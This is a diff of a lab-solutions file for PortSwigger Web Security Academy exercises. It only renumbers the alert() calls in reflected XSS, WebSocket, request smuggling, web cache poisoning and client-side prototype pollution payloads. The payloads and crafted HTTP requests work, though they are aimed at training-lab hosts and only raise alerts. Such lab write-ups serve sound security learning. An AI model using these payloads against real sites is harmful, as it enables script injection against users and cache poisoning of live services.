@@ -186,7 +186,7 @@ SELECT CASE WHEN (substring((SELECT password FROM users where username = 'admini
 #### XSS.01 - Reflected XSS into HTML context with nothing encoded
 
 ```
-<script>alert(1)</script>
+<script>alert(11)</script>
 ```
 
 
@@ -1258,7 +1258,7 @@ Content-Length: 120
 0
 
 GET /post?postId=6 HTTP/1.1
-User-Agent: useragent"><script>alert(1)</script><a href="/test
+User-Agent: useragent"><script>alert(24)</script><a href="/test
 Content-Length: 3
 
 a
@@ -1709,14 +1709,14 @@ There is a function to update the password, it generates a POST request with the
 #### WSOCK.01 - Manipulating WebSocket messages to exploit vulnerabilities
 
 ```
-script><img src=1 onerror='alert(1)'></script>
+script><img src=1 onerror='alert(25)'></script>
 ```
 
 
 #### WSOCK.02 - Manipulating the WebSocket handshake to exploit vulnerabilities
 
 ```
-ScRIpT><iMg sRc=x OnErRoR=alert`1`>
+ScRIpT><iMg sRc=x OnErRoR=alert`26`>
 ```
 
 
@@ -1753,7 +1753,7 @@ X-Forwarded-Host: exploit-0a26003703122ceb80d4074501290007.exploit-server.net
 
 ```
 GET / HTTP/2
-Cookie: session=OwRJHH4NdgNoL0ghzNHYgwQTFpmM6m0G; fehost=prod-cache-01"}</script><script>alert(1)</script><script>{"
+Cookie: session=OwRJHH4NdgNoL0ghzNHYgwQTFpmM6m0G; fehost=prod-cache-01"}</script><script>alert(26)</script><script>{"
 ...
 ```
 
@@ -1798,13 +1798,13 @@ Origin: https://cachebuster.0a68004803664d558681b8a800650043.web-security-academ
 ```
 
 ```
-GET /?evil='/><script>alert(1)</script> HTTP/2
+GET /?evil='/><script>alert(27)</script> HTTP/2
 ...
 Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
 ```
 
 ```
-GET /?evil='/><script>alert(1)</script> HTTP/2
+GET /?evil='/><script>alert(28)</script> HTTP/2
 ...
 ```
 
@@ -1812,14 +1812,14 @@ GET /?evil='/><script>alert(1)</script> HTTP/2
 #### WCACH.06 - Web cache poisoning via an unkeyed query parameter
 
 ```
-GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
+GET /?utm_content=testing123'/><script>alert(29)</script><link+href='/ HTTP/2
 ...
 Pragma: x-get-cache-key
 Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
 ```
 
 ```
-GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
+GET /?utm_content=testing123'/><script>alert(30)</script><link+href='/ HTTP/2
 ...
 ```
 
@@ -1827,14 +1827,14 @@ GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
 #### WCACH.07 - Parameter cloaking
 
 ```
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(31) HTTP/2
 ...
 Pragma: x-get-cache-key
 Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
 ```
 
 ```
-/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(32)
 ```
 
 
@@ -1847,7 +1847,7 @@ Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academ
 X-Http-Method-Override: POST
 Content-Length: 17
 
-callback=alert(1)
+callback=alert(33)
 ```
 
 ```
@@ -1856,13 +1856,13 @@ GET /js/geolocate.js?callback=setCountryCookie HTTP/2
 X-Http-Method-Override: POST
 Content-Length: 17
 
-callback=alert(1)
+callback=alert(34)
 ```
 
 
 #### WCACH.09 - URL normalization
 
-Use the URL-encoded version of /<script>alert(1)</script> (they have the same cache key)
+Use the URL-encoded version of /<script>alert(35)</script> (they have the same cache key)
 
 ```
 /%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
@@ -2392,21 +2392,21 @@ productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%
 #### PROPO.01 - DOM XSS via client-side prototype pollution
 
 ```
-/?__proto__[transport_url]=data:,alert(1);
+/?__proto__[transport_url]=data:,alert(41);
 ```
 
 
 #### PROPO.02 - DOM XSS via an alternative prototype pollution vector
 
 ```
-/?search=aaa&__proto__.sequence=alert(1)-
+/?search=aaa&__proto__.sequence=alert(42)-
 ```
 
 
 #### PROPO.03 - Client-side prototype pollution via flawed sanitization
 
 ```
-/?__pro__proto__to__[transport_url]=data:,alert(1);
+/?__pro__proto__to__[transport_url]=data:,alert(43);
 ```
 
 
@@ -2422,7 +2422,7 @@ productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%
 #### PROPO.05 - Client-side prototype pollution via browser APIs
 
 ```
-/?__proto__[value]=data:,alert(1)
+/?__proto__[value]=data:,alert(44)
 ```
 
 
